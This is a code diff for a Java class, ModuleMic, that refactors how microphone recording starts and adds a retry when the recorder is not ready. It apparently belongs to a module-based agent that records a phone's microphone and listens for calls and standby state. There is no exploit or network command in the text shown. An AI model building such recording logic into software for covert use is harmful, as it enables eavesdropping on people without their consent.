@@ -138,17 +138,18 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 
 			if (canRecordMic()) {
-				addPhoneListener();
+				startRecord();
+
 				if (Cfg.DEBUG) {
-					Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
+					Check.log(TAG + "started");//$NON-NLS-1$
 				}
-				ListenerStandby.self().attach(standbyObserver);
-				startRecorder();
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "cannot start");//$NON-NLS-1$
+				}
 			}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "started");//$NON-NLS-1$
-			}
+
 
 		} catch (final IllegalStateException e) {
 			if (Cfg.EXCEPTION) {
@@ -163,6 +164,15 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				Check.log(e);
 			}
 		}
+	}
+
+	private void startRecord() throws IOException {
+		addPhoneListener();
+		if (Cfg.DEBUG) {
+			Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
+		}
+		ListenerStandby.self().attach(standbyObserver);
+		startRecorder();
 	}
 
 	/*
@@ -207,6 +217,15 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (recorder == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualGo), recorder not ready");
+			}
+			if (canRecordMic()) {
+				try {
+					startRecord();
+				} catch (IOException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualGo), cannot start record: " + e);
+					}
+				}
 			}
 			return;
 		}
